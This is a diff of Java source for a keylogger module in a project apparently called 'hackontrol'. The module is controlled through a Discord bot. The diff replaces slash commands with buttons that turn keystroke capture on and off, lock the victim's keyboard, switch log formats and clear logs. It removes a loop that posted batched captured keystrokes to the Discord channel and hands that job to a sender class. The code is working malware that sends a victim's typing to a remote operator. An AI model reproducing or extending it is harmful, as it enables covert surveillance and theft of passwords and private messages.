@@ -1,32 +1,38 @@
 package com.khopan.hackontrol.channel.keylogger;
 
-import java.awt.event.KeyEvent;
-import java.util.ArrayList;
 import java.util.List;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
 
-import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
-import com.khopan.hackontrol.NativeLibrary.KeyEntry;
-import com.khopan.hackontrol.manager.command.CommandContext;
-import com.khopan.hackontrol.manager.command.CommandManager;
+import com.khopan.hackontrol.manager.button.ButtonContext;
+import com.khopan.hackontrol.manager.button.ButtonManager;
+import com.khopan.hackontrol.manager.button.Question;
+import com.khopan.hackontrol.manager.button.Question.OptionType;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.MessageHistory;
-import net.dv8tion.jda.api.interactions.commands.build.Commands;
+import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
+import net.dv8tion.jda.api.interactions.components.ActionRow;
+import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 
 public class KeyLoggerChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "key-logger";
+	private static final String CHANNEL_NAME = "keylogger";
 
-	private boolean rawKeyMode;
+	static boolean RawKeyMode;
 
-	public KeyLoggerChannel() {
-		this.rawKeyMode = false;
-	}
+	private static final Button BUTTON_ENABLE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable", "enableKeyLogger");
+	private static final Button BUTTON_DISABLE = ButtonManager.staticButton(ButtonStyle.DANGER, "Disable", "disableKeyLogger");
+
+	private static final Button BUTTON_LOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", "lockKeyboard");
+	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", "unlockKeyboard");
+
+	private static final Button BUTTON_RAW_KEY_MODE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Raw Key Mode", "rawKeyMode");
+	private static final Button BUTTON_TEXT_MODE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Text Mode", "textMode");
+
+	private static final Button BUTTON_CLEAR = ButtonManager.staticButton(ButtonStyle.DANGER, "Clear", "keyloggerClear");
 
 	@Override
 	public String getName() {
@@ -34,111 +40,77 @@ public class KeyLoggerChannel extends HackontrolChannel {
 	}
 
 	@Override
+	public void initialize() {
+		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
+	}
+
+	@Override
 	public void register(Registry registry) {
-		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("togglerawkey", "Toggle between raw key and text mode"), this :: commandToggleRawKey);
-		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("flush", "Delete all messages in this channel"), this :: commandFlush);
-		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: threadKeyLogger, 2500, 5000, TimeUnit.MILLISECONDS);
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_ENABLE, context -> this.buttonEnable(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_DISABLE, context -> this.buttonEnable(context, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, context -> this.buttonLock(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_RAW_KEY_MODE, context -> this.buttonRawKeyMode(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_TEXT_MODE, context -> this.buttonRawKeyMode(context, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_CLEAR, this :: buttonClear);
+		KeyLogSender.start(this.channel);
 	}
 
-	private void threadKeyLogger() {
-		if(!NativeLibrary.Enable) {
-			NativeLibrary.KEYSTROKE_LIST.clear();
+	private void buttonEnable(ButtonContext context, boolean enable) {
+		if(NativeLibrary.Enable == enable) {
+			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
 			return;
 		}
 
-		if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
+		if(enable) {
+			NativeLibrary.Enable = enable;
+			context.acknowledge();
 			return;
 		}
 
-		try {
-			int size = NativeLibrary.KEYSTROKE_LIST.size();
-			Hackontrol.LOGGER.info("Key stroke: {}", size);
-			List<String> messageList = new ArrayList<>();
-			StringBuilder builder = new StringBuilder();
-			boolean first = true;
-			boolean previousSingleCharacter = true;
-			boolean previousSpace = true;
-			int limit = this.rawKeyMode ? 2000 : 1992;
-			String prefix = this.rawKeyMode ? "" : "```\n";
-			String suffix = this.rawKeyMode ? "" : "\n```";
+		Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", OptionType.YES_NO, () -> NativeLibrary.Enable = false);
+	}
 
-			for(int i = 0; i < size; i++) {
-				KeyEntry entry = NativeLibrary.KEYSTROKE_LIST.get(i);
-				String entryText;
-
-				if(this.rawKeyMode) {
-					entryText = this.getKeyEntryText(entry);
-				} else {
-					if(!entry.keyDown) {
-						continue;
-					}
-
-					entryText = KeyConverter.decodeWin32VirtualKeyCode(entry.keyCode);
-					boolean singleCharacter = KeyConverter.isSingleCharacter(entry.keyCode);
-					boolean space = entry.keyCode == 0x20;
-
-					if((space || previousSpace) || (singleCharacter && previousSingleCharacter)) {
-						first = true;
-					}
-
-					previousSingleCharacter = singleCharacter;
-					previousSpace = space;
-				}
-
-				entryText = (first ? "" : " ") + entryText;
-				first = false;
-
-				if(builder.length() + entryText.length() > limit) {
-					messageList.add(builder.toString());
-					builder = new StringBuilder();
-					first = true;
-				}
-
-				builder.append(entryText);
-			}
-
-			NativeLibrary.KEYSTROKE_LIST.clear();
-
-			if(!builder.isEmpty()) {
-				messageList.add(builder.toString());
-			}
-
-			for(int i = 0; i < messageList.size(); i++) {
-				this.channel.sendMessage(prefix + messageList.get(i) + suffix).queue();
-			}
-		} catch(Throwable Errors) {
-			Errors.printStackTrace();
+	private void buttonLock(ButtonContext context, boolean lock) {
+		if(NativeLibrary.Block == lock) {
+			HackontrolMessage.boldDeletable(context.reply(), "Keyboard is already " + (lock ? "locked" : "unlocked"));
+			return;
 		}
+
+		if(lock) {
+			NativeLibrary.Block = lock;
+			context.acknowledge();
+			return;
+		}
+
+		Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", OptionType.YES_NO, () -> NativeLibrary.Block = false);
 	}
 
-	private void commandToggleRawKey(CommandContext context) {
-		this.rawKeyMode = !this.rawKeyMode;
-		HackontrolMessage.deletable(context.reply(), "**Current Mode: " + (this.rawKeyMode ? "Raw Key" : "Text") + "**");
+	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
+		if(KeyLoggerChannel.RawKeyMode == rawKeyMode) {
+			HackontrolMessage.boldDeletable(context.reply(), (rawKeyMode ? "Raw key" : "Text") + " mode is already enabled");
+			return;
+		}
+
+		KeyLoggerChannel.RawKeyMode = rawKeyMode;
+		context.acknowledge();
 	}
 
-	private void commandFlush(CommandContext context) {
-		MessageHistory.getHistoryFromBeginning(context.getChannel()).queue(history -> {
-			List<Message> list = history.getRetrievedHistory();
+	private void buttonClear(ButtonContext context) {
+		long identifier = context.getEvent().getMessageIdLong();
+		MessageChannel channel = context.getChannel();
+		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", OptionType.YES_NO, () -> {
+			MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
+				List<Message> list = history.getRetrievedHistory();
 
-			for(int i = 0; i < list.size(); i++) {
-				list.get(i).delete().queue();
-			}
+				for(int i = 0; i < list.size(); i++) {
+					Message message = list.get(i);
+
+					if(message.getIdLong() != identifier) {
+						message.delete().queue();
+					}
+				}
+			});
 		});
-
-		context.thinking(hook -> hook.deleteOriginal().queue());
-	}
-
-	private String getKeyEntryText(KeyEntry entry) {
-		String letter = KeyEvent.getKeyText(entry.keyCode);
-		int count = (entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0);
-		String asterisk = "*".repeat(count);
-		StringBuilder builder = new StringBuilder();
-		builder.append(asterisk);
-		builder.append('`');
-		builder.append(entry.keyDown ? '↓' : '↑');
-		builder.append(letter);
-		builder.append('`');
-		builder.append(asterisk);
-		return builder.toString();
 	}
 }
